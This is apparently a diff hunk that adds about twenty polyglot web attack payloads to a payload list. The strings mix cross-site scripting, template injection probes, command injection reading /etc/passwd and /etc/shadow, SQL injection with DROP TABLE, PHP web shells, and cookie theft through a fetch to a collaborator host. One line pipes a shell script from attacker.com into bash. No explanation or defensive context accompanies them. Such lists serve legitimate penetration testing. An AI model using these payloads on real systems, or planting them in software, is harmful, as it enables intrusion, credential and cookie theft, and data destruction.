@@ -1,4 +1,24 @@
 ```c
+'><svg/onload=alert(1)>{{7*7}}${{7*7}}#{7*7}`id`$(id);cat /etc/passwd;--><!--
+';cat /etc/passwd;echo '{{1337*2}}';--><script>alert(1)</script><!--
+"><script src=//0x7f.0x0.0x0/alert.js></script>{{7*'7'}}<?php system('id');?>
+${@print(md5(233))}<?php echo `id`; ?>../../../../etc/passwd%00<!--
+;echo Vulnerable;`ls`|id;--><img src=x onerror=confirm(1)>{{7*7}}
+';--></script><iframe src=javascript:alert(1)>--><?php passthru('id'); ?>
+"><svg/onload='fetch("http://burp.collab.com?c="+document.cookie)'>{{1337*1}}
+../../../../../../etc/passwd%00<?=`id`;?>"><img src onerror=alert(1)>
+`curl http://attacker.com/shell.sh | bash`"><svg onload=alert(1)>
+<%= 7*7 %>#{7*7}${{7*7}}' OR '1'='1'; DROP TABLE users;--><!--
+php://filter/read=convert.base64-encode/resource=index.php<!--
+expect://id"><script>alert(1)</script><!--
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id
+'||ping -c 3 attacker.com||'"><img src onerror=alert(1)>
+%0a%0d<script>alert(1)</script><?php system('id'); ?>{{7*'7'}}
+';waitfor delay '00:00:05'--><script>alert(1)</script><!--
+'||sleep(5)||'"><svg onload=confirm(1)><!--../../../../boot.ini
+${7*7}<?php system($_GET['cmd']); ?>../../../etc/shadow
+'"><marquee onstart=alert(1)>{{7*'7'}}<?xml version="1.0"?><!DOCTYPE
+<!--' OR 1=1--><?php echo shell_exec("id"); ?>{{constructor.constructor('alert(1)')()}}
 "><script>alert(1)</script>
 "><svg/onload=alert(1)>
 <iframe srcdoc="<script>alert(1)</script>">
